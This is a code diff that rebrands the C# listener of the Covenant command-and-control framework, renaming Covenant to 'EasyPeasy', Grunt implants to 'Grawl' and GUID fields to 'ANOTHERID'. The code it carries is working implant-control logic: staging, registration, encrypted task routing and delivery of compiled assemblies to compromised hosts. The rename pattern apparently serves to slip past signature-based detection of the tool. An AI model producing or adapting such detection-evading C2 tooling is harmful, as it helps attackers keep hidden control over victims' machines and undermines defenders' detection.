@@ -15,11 +15,11 @@ using Microsoft.CodeAnalysis;
 using Microsoft.AspNetCore.SignalR.Client;
 using Newtonsoft.Json;
 
-using Covenant.Core;
-using Covenant.API;
-using APIModels = Covenant.API.Models;
+using EasyPeasy.Core;
+using EasyPeasy.API;
+using APIModels = EasyPeasy.API.Models;
 
-namespace Covenant.Models.Listeners
+namespace EasyPeasy.Models.Listeners
 {
     public class InternalListener
     {
@@ -35,20 +35,20 @@ namespace Covenant.Models.Listeners
         public event EventHandler<NewMessageArgs> OnNewMessage = delegate { };
 
         private HubConnection _connection;
-        private ICovenantAPI _client;
+        private IEasyPeasyAPI _client;
         private ProfileTransformAssembly _transform;
         private readonly ModelUtilities _utilities = new ModelUtilities();
 
-        internal enum GruntMessageCacheStatus
+        internal enum GrawlMessageCacheStatus
         {
             Ok,
             NotFound
         }
-        internal class GruntMessageCacheInfo
+        internal class GrawlMessageCacheInfo
         {
-            public APIModels.GruntTasking Tasking { get; set; }
+            public APIModels.GrawlTasking Tasking { get; set; }
             public string Message { get; set; }
-            public GruntMessageCacheStatus Status { get; set; }
+            public GrawlMessageCacheStatus Status { get; set; }
         }
 
         internal class ProfileTransformAssembly
@@ -59,16 +59,16 @@ namespace Covenant.Models.Listeners
 
         private readonly object _hashCodesLock = new object();
         private readonly HashSet<int> CacheTaskHashCodes = new HashSet<int>();
-        private ConcurrentDictionary<string, ConcurrentQueue<GruntMessageCacheInfo>> GruntMessageCache { get; set; } = new ConcurrentDictionary<string, ConcurrentQueue<GruntMessageCacheInfo>>();
+        private ConcurrentDictionary<string, ConcurrentQueue<GrawlMessageCacheInfo>> GrawlMessageCache { get; set; } = new ConcurrentDictionary<string, ConcurrentQueue<GrawlMessageCacheInfo>>();
 
         public InternalListener()
         {
 
         }
 
-        public InternalListener(APIModels.Profile profile, string ListenerGuid, string CovenantUrl, string CovenantToken)
+        public InternalListener(APIModels.Profile profile, string ListenerGuid, string EasyPeasyUrl, string EasyPeasyToken)
         {
-            _ = Configure(profile, ListenerGuid, CovenantUrl, CovenantToken);
+            _ = Configure(profile, ListenerGuid, EasyPeasyUrl, EasyPeasyToken);
         }
 
         public class AlwaysRetryPolicy : IRetryPolicy
@@ -87,13 +87,13 @@ namespace Covenant.Models.Listeners
             }
         }
 
-        public async Task Configure(APIModels.Profile profile, string ListenerGuid, string CovenantUrl, string CovenantToken)
+        public async Task Configure(APIModels.Profile profile, string ListenerGuid, string EasyPeasyUrl, string EasyPeasyToken)
         {
             _transform = new ProfileTransformAssembly
             {
                 ProfileTransformBytes = Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
                 {
-                    Language = Grunts.ImplantLanguage.CSharp,
+                    Language = Grawls.ImplantLanguage.CSharp,
                     Source = profile.MessageTransform,
                     TargetDotNetVersion = Common.DotNetVersion.NetCore31,
                     References = Common.DefaultReferencesNetCore,
@@ -101,7 +101,7 @@ namespace Covenant.Models.Listeners
                 })
             };
 
-            X509Certificate2 covenantCert = new X509Certificate2(Common.CovenantPublicCertFile);
+            X509Certificate2 covenantCert = new X509Certificate2(Common.EasyPeasyPublicCertFile);
             HttpClientHandler clientHandler = new HttpClientHandler
             {
                 ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) =>
@@ -109,16 +109,16 @@ namespace Covenant.Models.Listeners
                     return cert.GetCertHashString() == covenantCert.GetCertHashString();
                 }
             };
-            _client = new CovenantAPI(
-                new Uri(CovenantUrl),
-                new TokenCredentials(CovenantToken),
+            _client = new EasyPeasyAPI(
+                new Uri(EasyPeasyUrl),
+                new TokenCredentials(EasyPeasyToken),
                 clientHandler
             );
 
             _connection = new HubConnectionBuilder()
-                .WithUrl(CovenantUrl + "/gruntHub", options =>
+                .WithUrl(EasyPeasyUrl + "/grawlHub", options =>
                 {
-                    options.AccessTokenProvider = () => { return Task.FromResult(CovenantToken); };
+                    options.AccessTokenProvider = () => { return Task.FromResult(EasyPeasyToken); };
                     options.HttpMessageHandlerFactory = inner =>
                     {
                         var HttpClientHandler = (HttpClientHandler)inner;
@@ -134,9 +134,9 @@ namespace Covenant.Models.Listeners
                 await Task.Delay(5000);
                 await _connection.StartAsync();
                 await _connection.InvokeAsync("JoinGroup", ListenerGuid);
-                _connection.On<string>("NotifyListener", (guid) =>
+                _connection.On<string>("NotifyListener", (anotherid) =>
                 {
-                    InternalRead(guid).Wait();
+                    InternalRead(anotherid).Wait();
                 });
             }
             catch (Exception e)
@@ -157,73 +157,73 @@ namespace Covenant.Models.Listeners
             };
         }
 
-        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(APIModels.Grunt grunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntTaskingMessage taskingMessage)
+        private ModelUtilities.GrawlEncMsg CreateMessageForGrawl(APIModels.Grawl grawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlTaskingMessage taskingMessage)
         {
-            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
+            return this.CreateMessageForGrawl(grawl, targetGrawl, Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
         }
 
-        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(APIModels.Grunt grunt, APIModels.Grunt targetGrunt, byte[] message)
+        private ModelUtilities.GrawlEncMsg CreateMessageForGrawl(APIModels.Grawl grawl, APIModels.Grawl targetGrawl, byte[] message)
         {
-            List<string> path = _client.GetPathToChildGrunt(grunt.Id ?? default, targetGrunt.Id ?? default).ToList();
+            List<string> path = _client.GetPathToChildGrawl(grawl.Id ?? default, targetGrawl.Id ?? default).ToList();
             path.Reverse();
-            ModelUtilities.GruntEncryptedMessage finalMessage = null;
-            ModelUtilities.GruntEncryptedMessageType messageType = ModelUtilities.GruntEncryptedMessageType.Tasking;
-            foreach (string guid in path)
+            ModelUtilities.GrawlEncMsg finalMessage = null;
+            ModelUtilities.GrawlEncMsgType messageType = ModelUtilities.GrawlEncMsgType.Tasking;
+            foreach (string anotherid in path)
             {
-                APIModels.Grunt thisGrunt = _client.GetGruntByGUID(guid);
-                finalMessage = ModelUtilities.GruntEncryptedMessage.Create(
-                    thisGrunt,
+                APIModels.Grawl thisGrawl = _client.GetGrawlByANOTHERID(anotherid);
+                finalMessage = ModelUtilities.GrawlEncMsg.Create(
+                    thisGrawl,
                     message,
                     messageType
                 );
-                message = Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
-                messageType = ModelUtilities.GruntEncryptedMessageType.Routing;
+                message = Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
+                messageType = ModelUtilities.GrawlEncMsgType.Routing;
             }
             return finalMessage;
         }
 
         private byte[] GetCompressedILAssembly35(string taskname)
         {
-            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNet35Directory + taskname + ".compiled");
+            return File.ReadAllBytes(Common.EasyPeasyTaskCSharpCompiledNet35Directory + taskname + ".compiled");
         }
 
         private byte[] GetCompressedILAssembly40(string taskname)
         {
-            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNet40Directory + taskname + ".compiled");
+            return File.ReadAllBytes(Common.EasyPeasyTaskCSharpCompiledNet40Directory + taskname + ".compiled");
         }
 
         private byte[] GetCompressedILAssembly30(string taskname)
         {
-            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNetCoreApp30Directory + taskname + ".compiled");
+            return File.ReadAllBytes(Common.EasyPeasyTaskCSharpCompiledNetCoreApp30Directory + taskname + ".compiled");
         }
 
-        private ModelUtilities.GruntTaskingMessage GetGruntTaskingMessage(APIModels.GruntTasking tasking, APIModels.DotNetVersion version)
+        private ModelUtilities.GrawlTaskingMessage GetGrawlTaskingMessage(APIModels.GrawlTasking tasking, APIModels.DotNetVersion version)
         {
             string Message = "";
-            if (tasking.Type == APIModels.GruntTaskingType.Assembly)
+            if (tasking.Type == APIModels.GrawlTaskingType.Assembly)
             {
                 if (version == APIModels.DotNetVersion.Net35)
                 {
-                    Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.GruntTask.Name));
+                    Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.GrawlTask.Name));
                     if (tasking.Parameters.Any())
                     {
-                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
+                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.EasyPeasyEncoding.GetBytes(P))));
                     }
                 }
                 else if (version == APIModels.DotNetVersion.Net40)
                 {
-                    Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.GruntTask.Name));
+                    Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.GrawlTask.Name));
                     if (tasking.Parameters.Any())
                     {
-                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
+                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.EasyPeasyEncoding.GetBytes(P))));
                     }
                 }
                 else if (version == APIModels.DotNetVersion.NetCore31)
                 {
-                    Message = Convert.ToBase64String(this.GetCompressedILAssembly30(tasking.GruntTask.Name));
+                    Message = Convert.ToBase64String(this.GetCompressedILAssembly30(tasking.GrawlTask.Name));
                     if (tasking.Parameters.Any())
                     {
-                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
+                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.EasyPeasyEncoding.GetBytes(P))));
                     }
                 }
             }
@@ -231,50 +231,50 @@ namespace Covenant.Models.Listeners
             {
                 Message = string.Join(",", tasking.Parameters);
             }
-            return new ModelUtilities.GruntTaskingMessage
+            return new ModelUtilities.GrawlTaskingMessage
             {
                 Type = tasking.Type,
                 Name = tasking.Name,
                 Message = Message,
-                Token = tasking.GruntTask == null ? false : tasking.GruntTask.TokenTask
+                Token = tasking.GrawlTask == null ? false : tasking.GrawlTask.TokenTask
             };
         }
 
-        private int GetTaskingHashCode(APIModels.GruntTasking tasking)
+        private int GetTaskingHashCode(APIModels.GrawlTasking tasking)
         {
             if (tasking != null)
             {
                 int code = tasking.Id ?? default;
-                code ^= tasking.GruntId;
-                code ^= tasking.GruntTaskId;
-                code ^= tasking.GruntCommandId ?? default;
+                code ^= tasking.GrawlId;
+                code ^= tasking.GrawlTaskId;
+                code ^= tasking.GrawlCommandId ?? default;
                 foreach (char c in tasking.Name) { code ^= c; }
                 return code;
             }
             return Guid.NewGuid().GetHashCode();
         }
 
-        private int GetCacheEntryHashCode(GruntMessageCacheInfo cacheEntry)
+        private int GetCacheEntryHashCode(GrawlMessageCacheInfo cacheEntry)
         {
             return GetTaskingHashCode(cacheEntry.Tasking);
         }
 
-        private void PushCache(string guid, GruntMessageCacheInfo cacheEntry)
+        private void PushCache(string anotherid, GrawlMessageCacheInfo cacheEntry)
         {
-            if (this.GruntMessageCache.TryGetValue(guid, out ConcurrentQueue<GruntMessageCacheInfo> cacheQueue))
+            if (this.GrawlMessageCache.TryGetValue(anotherid, out ConcurrentQueue<GrawlMessageCacheInfo> cacheQueue))
             {
                 lock (_hashCodesLock)
                 {
                     if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                     {
                         cacheQueue.Enqueue(cacheEntry);
-                        this.OnNewMessage(this, new NewMessageArgs(guid));
+                        this.OnNewMessage(this, new NewMessageArgs(anotherid));
                     }
                 }
             }
             else
             {
-                cacheQueue = new ConcurrentQueue<GruntMessageCacheInfo>();
+                cacheQueue = new ConcurrentQueue<GrawlMessageCacheInfo>();
                 lock (_hashCodesLock)
                 {
                     if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
@@ -282,117 +282,117 @@ namespace Covenant.Models.Listeners
                         cacheQueue.Enqueue(cacheEntry);
                     }
                 }
-                this.GruntMessageCache[guid] = cacheQueue;
-                this.OnNewMessage(this, new NewMessageArgs(guid));
+                this.GrawlMessageCache[anotherid] = cacheQueue;
+                this.OnNewMessage(this, new NewMessageArgs(anotherid));
             }
         }
 
-        private async Task<APIModels.Grunt> GetGruntForGuid(string guid)
+        private async Task<APIModels.Grawl> GetGrawlForGuid(string anotherid)
         {
             try
             {
-                if (!string.IsNullOrEmpty(guid))
+                if (!string.IsNullOrEmpty(anotherid))
                 {
-                    return await _client.GetGruntByGUIDAsync(guid);
+                    return await _client.GetGrawlByANOTHERIDAsync(anotherid);
                 }
             }
             catch (Exception) { }
             return null;
         }
 
-        private async Task<APIModels.Grunt> CheckInGrunt(APIModels.Grunt grunt)
+        private async Task<APIModels.Grawl> CheckInGrawl(APIModels.Grawl grawl)
         {
-            if (grunt == null)
+            if (grawl == null)
             {
                 return null;
             }
-            grunt.LastCheckIn = DateTime.UtcNow;
-            return await _client.EditGruntAsync(grunt);
+            grawl.LastCheckIn = DateTime.UtcNow;
+            return await _client.EditGrawlAsync(grawl);
         }
 
-        private async Task<APIModels.GruntTasking> MarkTasked(APIModels.GruntTasking tasking)
+        private async Task<APIModels.GrawlTasking> MarkTasked(APIModels.GrawlTasking tasking)
         {
             if (tasking == null)
             {
                 return null;
             }
-            tasking.Status = APIModels.GruntTaskingStatus.Tasked;
+            tasking.Status = APIModels.GrawlTaskingStatus.Tasked;
             tasking.TaskingTime = DateTime.UtcNow;
-            return await _client.EditGruntTaskingAsync(tasking);
+            return await _client.EditGrawlTaskingAsync(tasking);
         }
 
-        public async Task<string> Read(string guid)
+        public async Task<string> Read(string anotherid)
         {
-            if (string.IsNullOrEmpty(guid))
+            if (string.IsNullOrEmpty(anotherid))
             {
                 return "";
             }
-            await CheckInGrunt(await GetGruntForGuid(guid));
-            if (this.GruntMessageCache.TryGetValue(guid, out ConcurrentQueue<GruntMessageCacheInfo> cache))
+            await CheckInGrawl(await GetGrawlForGuid(anotherid));
+            if (this.GrawlMessageCache.TryGetValue(anotherid, out ConcurrentQueue<GrawlMessageCacheInfo> cache))
             {
-                if (cache.TryDequeue(out GruntMessageCacheInfo cacheEntry))
+                if (cache.TryDequeue(out GrawlMessageCacheInfo cacheEntry))
                 {
                     switch (cacheEntry.Status)
                     {
-                        case GruntMessageCacheStatus.NotFound:
+                        case GrawlMessageCacheStatus.NotFound:
                             await this.MarkTasked(cacheEntry.Tasking);
                             throw new ControllerNotFoundException(cacheEntry.Message);
-                        case GruntMessageCacheStatus.Ok:
+                        case GrawlMessageCacheStatus.Ok:
                             await this.MarkTasked(cacheEntry.Tasking);
                             return cacheEntry.Message;
                     }
                 }
                 return "";
             }
-            await InternalRead(guid);
+            await InternalRead(anotherid);
             return "";
         }
 
-        private async Task InternalRead(string guid)
+        private async Task InternalRead(string anotherid)
         {
             try
             {
-                APIModels.Grunt temp = await GetGruntForGuid(guid);
-                APIModels.Grunt grunt = await CheckInGrunt(temp);
-                if (grunt == null)
+                APIModels.Grawl temp = await GetGrawlForGuid(anotherid);
+                APIModels.Grawl grawl = await CheckInGrawl(temp);
+                if (grawl == null)
                 {
-                    // Invalid GUID. May not be legitimate Grunt request, respond Ok
-                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = "" });
+                    // Invalid ANOTHERID. May not be legitimate Grawl request, respond Ok
+                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = "" });
                 }
                 else
                 {
-                    IList<APIModels.GruntTasking> gruntTaskings = await _client.GetSearchUninitializedGruntTaskingsAsync(grunt.Id ?? default);
-                    if (gruntTaskings == null || gruntTaskings.Count == 0)
+                    IList<APIModels.GrawlTasking> grawlTaskings = await _client.GetSearchUninitializedGrawlTaskingsAsync(grawl.Id ?? default);
+                    if (grawlTaskings == null || grawlTaskings.Count == 0)
                     {
-                        // No GruntTasking assigned. Respond with empty template
-                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = "" });
+                        // No GrawlTasking assigned. Respond with empty template
+                        this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = "" });
                     }
                     else
                     {
-                        foreach (APIModels.GruntTasking tasking in gruntTaskings)
+                        foreach (APIModels.GrawlTasking tasking in grawlTaskings)
                         {
-                            APIModels.GruntTasking gruntTasking = tasking;
-                            if (gruntTasking.Type == APIModels.GruntTaskingType.Assembly && gruntTasking.GruntTask == null)
+                            APIModels.GrawlTasking grawlTasking = tasking;
+                            if (grawlTasking.Type == APIModels.GrawlTaskingType.Assembly && grawlTasking.GrawlTask == null)
                             {
                                 // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
-                                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = gruntTasking });
+                                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = grawlTasking });
                             }
                             else
                             {
-                                gruntTasking.Grunt = gruntTasking.GruntId == grunt.Id ? grunt : await _client.GetGruntAsync(gruntTasking.GruntId);
-                                ModelUtilities.GruntEncryptedMessage message = null;
+                                grawlTasking.Grawl = grawlTasking.GrawlId == grawl.Id ? grawl : await _client.GetGrawlAsync(grawlTasking.GrawlId);
+                                ModelUtilities.GrawlEncMsg message = null;
                                 try
                                 {
-                                    message = this.CreateMessageForGrunt(grunt, gruntTasking.Grunt, this.GetGruntTaskingMessage(gruntTasking, gruntTasking.Grunt.DotNetVersion));
+                                    message = this.CreateMessageForGrawl(grawl, grawlTasking.Grawl, this.GetGrawlTaskingMessage(grawlTasking, grawlTasking.Grawl.DotNetVersion));
                                     // Transform response
-                                    string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-                                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = gruntTasking });
+                                    string transformed = this._utilities.ProfileTransform(_transform, Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+                                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = grawlTasking });
                                 }
                                 catch (HttpOperationException)
                                 {
-                                    gruntTasking.Status = APIModels.GruntTaskingStatus.Aborted;
-                                    await _client.EditGruntTaskingAsync(gruntTasking);
-                                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                                    grawlTasking.Status = APIModels.GrawlTaskingStatus.Aborted;
+                                    await _client.EditGrawlTaskingAsync(grawlTasking);
+                                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                                 }
                             }
                         }
@@ -401,121 +401,121 @@ namespace Covenant.Models.Listeners
             }
             catch (Exception)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "" });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "" });
             }
         }
 
-        public async Task<string> Write(string guid, string data)
+        public async Task<string> Write(string anotherid, string data)
         {
             try
             {
-                ModelUtilities.GruntEncryptedMessage message = null;
+                ModelUtilities.GrawlEncMsg message = null;
                 try
                 {
-                    string inverted = Common.CovenantEncoding.GetString(this._utilities.ProfileInvert(_transform, data));
-                    message = JsonConvert.DeserializeObject<ModelUtilities.GruntEncryptedMessage>(inverted);
+                    string inverted = Common.EasyPeasyEncoding.GetString(this._utilities.ProfileInvert(_transform, data));
+                    message = JsonConvert.DeserializeObject<ModelUtilities.GrawlEncMsg>(inverted);
                 }
                 catch (Exception)
                 {
-                    // Request not formatted correctly. May not be legitimate Grunt request, respond NotFound
-                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                    return guid;
+                    // Request not formatted correctly. May not be legitimate Grawl request, respond NotFound
+                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                    return anotherid;
                 }
-                APIModels.Grunt egressGrunt;
+                APIModels.Grawl egressGrawl;
                 try
                 {
-                    egressGrunt = guid == null ? null : await _client.GetGruntByGUIDAsync(guid);
+                    egressGrawl = anotherid == null ? null : await _client.GetGrawlByANOTHERIDAsync(anotherid);
                 }
                 catch (HttpOperationException)
                 {
-                    egressGrunt = null;
+                    egressGrawl = null;
                 }
-                APIModels.Grunt targetGrunt = null;
+                APIModels.Grawl targetGrawl = null;
                 try
                 {
-                    targetGrunt = await _client.GetGruntByGUIDAsync(message.GUID);
+                    targetGrawl = await _client.GetGrawlByANOTHERIDAsync(message.ANOTHERID);
                 }
                 catch (HttpOperationException)
                 {
-                    targetGrunt = null;
+                    targetGrawl = null;
                     // Stage0 Guid is OriginalServerGuid + Guid
-                    if (message.GUID.Length == 20)
+                    if (message.ANOTHERID.Length == 20)
                     {
-                        string originalServerGuid = message.GUID.Substring(0, 10);
-                        guid = message.GUID.Substring(10, 10);
-                        targetGrunt = await _client.GetGruntByOriginalServerGUIDAsync(originalServerGuid);
-                        if (targetGrunt != null)
+                        string originalServerGuid = message.ANOTHERID.Substring(0, 10);
+                        anotherid = message.ANOTHERID.Substring(10, 10);
+                        targetGrawl = await _client.GetGrawlByOriginalServerANOTHERIDAsync(originalServerGuid);
+                        if (targetGrawl != null)
                         {
-                            var it = await _client.GetImplantTemplateAsync(targetGrunt.ImplantTemplateId);
-                            if (egressGrunt == null && it.CommType == APIModels.CommunicationType.SMB)
+                            var it = await _client.GetImplantTemplateAsync(targetGrawl.ImplantTemplateId);
+                            if (egressGrawl == null && it.CommType == APIModels.CommunicationType.SMB)
                             {
-                                // Get connecting Grunt as egress
-                                List<APIModels.GruntTasking> taskings = (await _client.GetAllGruntTaskingsAsync()).ToList();
-                                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
-                                APIModels.GruntTasking connectTasking = taskings
-                                    .Where(GT => GT.Type == APIModels.GruntTaskingType.Connect &&
-                                            (GT.Status == APIModels.GruntTaskingStatus.Progressed || GT.Status == APIModels.GruntTaskingStatus.Tasked))
+                                // Get connecting Grawl as egress
+                                List<APIModels.GrawlTasking> taskings = (await _client.GetAllGrawlTaskingsAsync()).ToList();
+                                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ anotherid of some sort?
+                                APIModels.GrawlTasking connectTasking = taskings
+                                    .Where(GT => GT.Type == APIModels.GrawlTaskingType.Connect &&
+                                            (GT.Status == APIModels.GrawlTaskingStatus.Progressed || GT.Status == APIModels.GrawlTaskingStatus.Tasked))
                                     .Reverse()
                                     .FirstOrDefault();
                                 if (connectTasking == null)
                                 {
-                                    egressGrunt = null;
+                                    egressGrawl = null;
                                 }
                                 else
                                 {
-                                    APIModels.Grunt taskedGrunt = await _client.GetGruntAsync(connectTasking.GruntId);
-                                    egressGrunt ??= await _client.GetOutboundGruntAsync(taskedGrunt.Id ?? default);
+                                    APIModels.Grawl taskedGrawl = await _client.GetGrawlAsync(connectTasking.GrawlId);
+                                    egressGrawl ??= await _client.GetOutboundGrawlAsync(taskedGrawl.Id ?? default);
                                 }
                             }
                         }
-                        await this.PostStage0(egressGrunt, targetGrunt, message, message.GUID.Substring(10), guid);
-                        return guid;
+                        await this.PostStage0(egressGrawl, targetGrawl, message, message.ANOTHERID.Substring(10), anotherid);
+                        return anotherid;
                     }
                     else
                     {
-                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                        return guid;
+                        this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                        return anotherid;
                     }
                 }
 
-                switch (targetGrunt.Status)
+                switch (targetGrawl.Status)
                 {
-                    case APIModels.GruntStatus.Uninitialized:
-                        await this.PostStage0(egressGrunt, targetGrunt, message, guid, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Stage0:
-                        await this.PostStage1(egressGrunt, targetGrunt, message, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Stage1:
-                        await this.PostStage2(egressGrunt, targetGrunt, message, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Stage2:
-                        await this.RegisterGrunt(egressGrunt, targetGrunt, message, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Active:
-                        await this.PostTask(egressGrunt, targetGrunt, message, egressGrunt.Guid);
-                        return guid;
-                    case APIModels.GruntStatus.Lost:
-                        await this.PostTask(egressGrunt, targetGrunt, message, egressGrunt.Guid);
-                        return guid;
+                    case APIModels.GrawlStatus.Uninitialized:
+                        await this.PostStage0(egressGrawl, targetGrawl, message, anotherid, anotherid);
+                        return anotherid;
+                    case APIModels.GrawlStatus.Stage0:
+                        await this.PostStage1(egressGrawl, targetGrawl, message, anotherid);
+                        return anotherid;
+                    case APIModels.GrawlStatus.Stage1:
+                        await this.PostStage2(egressGrawl, targetGrawl, message, anotherid);
+                        return anotherid;
+                    case APIModels.GrawlStatus.Stage2:
+                        await this.RegisterGrawl(egressGrawl, targetGrawl, message, anotherid);
+                        return anotherid;
+                    case APIModels.GrawlStatus.Active:
+                        await this.PostTask(egressGrawl, targetGrawl, message, egressGrawl.Guid);
+                        return anotherid;
+                    case APIModels.GrawlStatus.Lost:
+                        await this.PostTask(egressGrawl, targetGrawl, message, egressGrawl.Guid);
+                        return anotherid;
                     default:
-                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                        return guid;
+                        this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                        return anotherid;
                 }
             }
             catch
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                return guid;
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                return anotherid;
             }
         }
 
-        private async Task PostTask(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage outputMessage, string guid)
+        private async Task PostTask(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg outputMessage, string anotherid)
         {
-            if (targetGrunt == null || egressGrunt == null || egressGrunt.Guid != guid)
+            if (targetGrawl == null || egressGrawl == null || egressGrawl.Guid != anotherid)
             {
-                // Invalid GUID. May not be legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid ANOTHERID. May not be legitimate Grawl request, respond NotFound
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
@@ -523,297 +523,297 @@ namespace Covenant.Models.Listeners
             if (string.IsNullOrWhiteSpace(TaskName))
             {
                 // Invalid task response. This happens on post-register write
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            APIModels.GruntTasking gruntTasking;
+            APIModels.GrawlTasking grawlTasking;
             try
             {
-                gruntTasking = await _client.GetGruntTaskingByNameAsync(TaskName);
+                grawlTasking = await _client.GetGrawlTaskingByNameAsync(TaskName);
             }
             catch (HttpOperationException)
             {
-                // Invalid taskname. May not be legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid taskname. May not be legitimate Grawl request, respond NotFound
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
-            if (targetGrunt == null)
+            if (targetGrawl == null)
             {
-                // Invalid Grunt. May not be legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid Grawl. May not be legitimate Grawl request, respond NotFound
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
             {
-                // Invalid signature. Almost certainly not a legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid signature. Almost certainly not a legitimate Grawl request, respond NotFound
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            string taskRawResponse = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, outputMessage));
-            ModelUtilities.GruntTaskingMessageResponse taskResponse = JsonConvert.DeserializeObject<ModelUtilities.GruntTaskingMessageResponse>(taskRawResponse);
-            APIModels.GruntCommand command = await _client.GetGruntCommandAsync(gruntTasking.GruntCommandId ?? default);
+            string taskRawResponse = Common.EasyPeasyEncoding.GetString(_utilities.GrawlSessionDecrypt(targetGrawl, outputMessage));
